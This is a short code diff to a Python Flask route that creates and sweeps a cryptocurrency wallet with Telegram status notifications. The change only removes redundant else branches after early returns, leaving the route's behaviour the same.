@@ -310,16 +310,14 @@ def api_route():
         if not success:
             tg_notify(f"*Error - Wallet Creation Failed (2/3)*\n\n{message}")
             return jsonify({'error': 'Wallet creation failed.'}), 500
-        else:
-            tg_notify("*Success - Wallet Created (2/3)*\n\nWallet created successfully.")
+        tg_notify("*Success - Wallet Created (2/3)*\n\nWallet created successfully.")
 
         success, message = wallet_manager.sweep_wallet(receiver)
         if success:
             tg_notify("*Success - Wallet Swept (3/3)*\n\nWallet swept successfully.")
             return jsonify({'message': 'Wallet swept successfully.'}), 200
-        else:
-            tg_notify(f"*Error - Wallet Not Swept (3/3)*\n\n{message}")
-            return jsonify({'error': 'Wallet sweep failed.'}), 500
+        tg_notify(f"*Error - Wallet Not Swept (3/3)*\n\n{message}")
+        return jsonify({'error': 'Wallet sweep failed.'}), 500
 
     except Exception as e:
         safe_log(f'Unexpected error in api_route: {e}', sensitive=True)
